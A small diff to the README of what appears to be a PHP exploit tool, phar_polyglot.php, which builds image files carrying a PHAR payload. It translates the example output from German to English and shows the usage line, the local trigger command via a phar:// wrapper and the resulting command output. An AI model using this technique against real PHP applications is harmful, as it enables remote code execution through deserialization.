@@ -9,9 +9,9 @@ Usage: php -c php.ini phar_polyglot.php <command> [jpg|png|gif]
 # Example
 ```
 php -c php.ini phar_polyglot.php whoami jpg
-[+] Polyglot erfolgreich erstellt: exploit.jpg
+[+] Polyglot created: exploit.jpg
 
-[+] Lokaler Test (triggert den Exploit):
+[+] To trigger the payload locally:
 php -r 'file_exists("phar://exploit.jpg/test.txt");'
 kali
 ```
